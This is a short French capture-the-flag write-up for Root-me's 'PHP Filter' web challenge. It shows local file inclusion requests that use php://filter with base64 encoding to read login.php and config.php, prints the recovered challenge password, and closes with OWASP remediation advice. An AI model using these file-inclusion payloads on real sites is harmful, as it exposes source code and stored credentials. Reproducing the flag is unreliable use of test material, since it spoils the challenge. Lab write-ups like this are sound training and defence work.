# Challenges

## Root-me | [PHP Filter](https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters)

### Étapes :

- L'URL du challenge contient un paramètre qui charge des fichiers : http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php
- Utilisation d'un PHP Filter pour récupérer le contenu du fichier login.php : http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php
- Le fichier login.php contient un include d'un fichier config.php on récupère son contenu de la même manière que le fichier login : http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php
- Le fichier config.php contient le password en clair : "DAPt9D2mky0APAF"

### Recommandations :

- Référence : https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion

- Essayer d'éviter dans la mesure du possible l'inclusion de fichier avec une saisie accessible par l'utilisateur
- Si jamais on ne peut pas éviter l'inclusion, il faut absolument mettre en place une white liste contenant tous les fichiers autorisés à être inclus et refuser les requêtes des fichiers n'étant pas dans cette liste.
